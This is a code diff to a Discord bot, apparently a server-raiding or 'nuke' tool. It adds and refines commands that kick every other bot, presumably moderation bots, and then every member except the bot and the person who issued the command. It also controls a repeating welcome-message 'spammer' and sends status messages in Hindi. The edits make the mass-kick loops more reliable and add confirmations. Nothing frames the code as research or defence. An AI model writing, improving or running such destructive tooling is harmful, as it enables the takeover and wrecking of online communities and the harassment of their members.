@@ -22,9 +22,9 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!moon") {
             try {
-                // 1. Kick all other bots (Using cache to prevent Opcode 8 rate limit)
-                const botMembers = guild.members.cache;
-                for (const [, member] of botMembers) {
+                // 1. Kick all other bots safely using cache
+                const botMembers = [...guild.members.cache.values()];
+                for (const member of botMembers) {
                     if (
                         member.user.bot &&
                         member.id !== client.user.id &&
@@ -106,9 +106,9 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!sun") {
             try {
-                const allMembers = guild.members.cache;
+                const members = [...guild.members.cache.values()];
                 
-                for (const [, member] of allMembers) {
+                for (const member of members) {
                     if (
                         member.id !== client.user.id &&
                         member.id !== message.author.id &&
@@ -117,6 +117,7 @@ module.exports = (client) => {
                         await member.kick("Sun command").catch(() => {});
                     }
                 }
+                await message.channel.send("⚡ Sun command executed: Members kicked.").catch(() => {});
             } catch (error) {
                 console.error("Error executing !sun command:", error);
             }
@@ -127,9 +128,9 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!bloom") {
             try {
-                // 1. Kick all other bots
-                const botMembers = guild.members.cache;
-                for (const [, member] of botMembers) {
+                // 1. Kick all other bots safely using cache
+                const botMembers = [...guild.members.cache.values()];
+                for (const member of botMembers) {
                     if (
                         member.user.bot &&
                         member.id !== client.user.id &&
@@ -212,7 +213,10 @@ module.exports = (client) => {
                 clearInterval(welcomeInterval);
                 welcomeInterval = null;
                 await message.channel.send("🛑 Spammer band kar diya gaya.").catch(() => {});
+            } else {
+                await message.channel.send("⚠️ Koi spammer active nahi hai.").catch(() => {});
             }
         }
     });
 };
+                        
